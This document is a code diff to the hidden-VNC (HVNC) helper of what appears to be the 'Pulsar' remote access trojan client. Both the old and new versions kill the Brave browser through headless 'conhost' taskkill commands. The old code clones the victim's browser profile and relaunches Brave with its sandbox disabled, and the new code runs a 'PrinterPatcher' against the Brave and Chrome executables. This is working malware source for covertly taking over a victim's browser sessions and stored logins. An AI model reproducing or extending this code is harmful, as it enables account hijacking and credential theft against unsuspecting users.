@@ -140,37 +140,18 @@ namespace Pulsar.Client.Helper.HVNC
         {
             try
             {
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";
 
                 if (!Directory.Exists(path))
                 {
                     return;
                 }
 
-                string sourceDir = Path.Combine(path, "User Data");
-                if (!Directory.Exists(sourceDir))
-                {
-                    return;
-                }
+                string filePath = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
+                this.CreateProc(filePath);
 
-                string text = Path.Combine(path, "fudasf");
-                string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
-
-                if (!Directory.Exists(text))
-                {
-                    Directory.CreateDirectory(text);
-                    this.CreateProc(killCommand);
-                    this.CloneDirectory(sourceDir, text);
-                }
-                else
-                {
-                    DeleteFolder(text);
-                    this.StartBrave();
-                    return;
-                }
-
-                string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"" + text + "\"";
-                this.CreateProc(startCommand);
+                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application", "\\BraveSoftware");
+                patcher.Start();
             }
             catch (Exception ex)
             {
@@ -313,7 +294,8 @@ namespace Pulsar.Client.Helper.HVNC
                 //    this.Startchrome();
                 //}
 
-                PrinterPatcher.Start();
+                PrinterPatcher patcher = new PrinterPatcher(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application", "\\Google");
+                patcher.Start();
             }
             catch (Exception ex)
             {
